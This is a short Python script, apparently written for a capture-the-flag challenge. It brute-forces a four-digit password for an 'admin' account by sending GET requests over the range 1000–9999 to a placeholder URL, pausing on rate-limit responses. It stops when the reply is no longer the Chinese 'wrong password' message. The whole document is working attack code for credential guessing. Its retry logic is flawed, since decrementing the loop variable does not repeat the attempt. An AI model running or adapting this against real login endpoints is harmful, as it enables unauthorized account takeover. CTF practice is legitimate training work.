# /usr/bin/python
# -*- coding: utf-8 -*-

import time
import requests

url = "http://URL/?username=admin&password="

for i in range(1000,10000):
    res = requests.get(url+str(i))
    print("Try: " + url + str(i) + "|" + res.text)
    if "429" in res.text:
        time.sleep(0.5)
        i = i - 1
        continue
    if res.text != "密码错误，为四位数字。":
        print("Password is" + str(i))
        break

'''
This is used to attack some CTF server which cotains a get-form and use 4 bit number as password.
'''